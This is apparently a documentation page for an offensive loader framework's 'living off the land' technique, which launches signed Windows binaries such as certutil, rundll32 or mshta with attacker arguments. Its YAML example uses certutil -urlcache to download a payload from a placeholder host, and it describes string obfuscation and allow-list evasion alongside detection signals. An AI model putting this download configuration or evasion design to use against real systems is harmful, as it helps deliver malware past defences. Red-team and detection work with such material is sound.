# Living off the land

## Metadata

- **ATT&CK**: T1218 (System Binary Proxy Execution), T1105 (Ingress Tool
  Transfer)
- **Stability**: Experimental
- **Category**: Control
- **YAML key**: `living_off_the_land`
- **Introduced in**: Multi-stage plans (schema 5)

## What it does

Launches a process — a signed Microsoft binary or any command — from the generated stub.

The intended use is a LOLBin: a signed, already-present system executable
(`certutil.exe`, `rundll32.exe`, `mshta.exe`, ...) is started with attacker
arguments, so the work happens under a trusted binary instead of a dropped
payload. It is a Control technique: it does not decrypt, map or run the payload,
it only orchestrates the chain.

## YAML parameters

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| `binary` | string | yes | – | Process to launch. A bare name (no `\` or `/`) is resolved against `System32` at run time; a path is used as is. |
| `args` | list of strings | no | `[]` | Arguments passed to `binary`. Each is quoted with the `CommandLineToArgvW` rules. |
| `window` | `hidden` \| `normal` | no | `hidden` | Console/window visibility. `hidden` adds `CREATE_NO_WINDOW`. |
| `wait` | bool | no | `true` | Wait for the child and return its exit code. `false` detaches and returns `0`. |
| `timeout_s` | integer | no | `0` | Seconds to wait for the child when `wait: true`. `0` means no limit (`INFINITE`). |

## YAML example

```yaml
runtime:
  - technique: living_off_the_land
    params:
      binary: certutil.exe
      args: ["-urlcache", "-f", "http://host/payload.bin", "C:\\ProgramData\\p.bin"]
      window: hidden
      wait: true
      timeout_s: 30
```

## How it works

1. Resolve `binary`: a bare name is joined to `%SystemRoot%\System32`; anything
   containing `\` or `/` is used verbatim.
2. Build the command line: the executable is quoted, then every argument.
3. `CreateProcessA` with the creation flags from `window` (`CREATE_NO_WINDOW`
   when hidden) and an empty environment block, so the child gets the parent's
   environment.
4. When `wait` is `true`, `WaitForSingleObject` (with `timeout_s * 1000` ms, or
   `INFINITE` when `0`) and `GetExitCodeProcess` return the child's exit code.
   When `false`, the handles are closed and the stage returns `0` immediately.
5. Both process handles are closed.

## What it evades

- Static inspection of a dropped tool: the binary is a signed system file, so
  the action does not add an attacker-controlled artifact to disk.
- Signature/allow-list controls that trust Microsoft-signed binaries (the
  T1218 premise). The effectiveness depends entirely on the chosen LOLBin and
  its own detection state.

## What detects it

- Command-line telemetry (`4688`/Sysmon `1`) for the launched binary and its
  arguments. A LOLBin with an unusual parent, URL or output path is the primary
  signal.
- EDR rules per LOLBin (e.g. `certutil -urlcache`, `rundll32` with an
  unexpected DLL, `mshta` with a remote URL).
- `CreateProcessA` itself is a statically visible import of the stub.

## Measurements

- Pending — the fragment imports `CreateProcessA`, `GetExitCodeProcess`,
  `WaitForSingleObject` and `CloseHandle`. The binary and argument literals are
  reconstructed at run time (XOR/stack) and do not appear in `.rdata`. See
  `docs/measurements.md`.

## Implementation notes

- The technique is the `exec` stage launcher promoted to a technique; the
  fragment is the same code (`run_exec`, `resolve_binary`, `quote_arg`), so the
  two must stay in step.
- `binary` and every element of `args` go through `StringsConfig` at render
  time, so no command line appears in cleartext in the generated stub.
- `wait: false` is fire-and-forget: the child is not terminated and its exit
  code is never read. `timeout_s` only bounds a waiting stage; on timeout the
  child keeps running and its current exit code (`STILL_ACTIVE`) is returned.
- `CreateProcessA` stays Win32: launching a process is a loader entry point, not
  a syscall the stub issues through the indirect-syscall layer.

## References

- MITRE ATT&CK T1218 — System Binary Proxy Execution.
- MITRE ATT&CK T1105 — Ingress Tool Transfer (e.g. `certutil -urlcache`).
